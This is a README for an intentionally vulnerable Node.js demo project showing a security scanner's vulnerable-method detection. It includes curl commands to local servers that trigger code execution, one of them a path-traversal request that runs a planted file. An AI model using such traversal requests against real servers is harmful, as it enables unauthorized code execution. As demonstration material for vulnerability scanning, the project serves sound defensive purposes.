# [:] Example node project with vulnerable methods

A node project to demonstrate srcclr agent's vulnerable methods feature for JavaScript

## Vulnerability 1 Exploit

```
git clone https://github.com/srcclr/example-javascript-vulnerable-methods.git
cd example-javascript-vulnerable-methods
npm install
node index.js

```

and then run the following command in another terminal

```
curl --path-as-is 'http://127.0.0.1:8001/api/'
```
You can see the the code execution vulnerability are executed mutliple times.


## Vulnerability 2 Exploit

```
git clone https://github.com/srcclr/example-javascript-vulnerable-methods.git
cd example-javascript-vulnerable-methods
npm install
node larvitbase-api.js

```

and then run the following command in another terminal

```
curl --path-as-is 'http://127.0.0.1:8001/../../../../hacked'
```
You can see the JavaScript file`hacked.js` is executed in the server side.

## Scan with SRCCLR Agent

```
brew tap srcclr/srcclr
brew install srcclr
srcclr activate
srcclr scan --url https://github.com/srcclr/example-javascript-vulnerable-methods
```
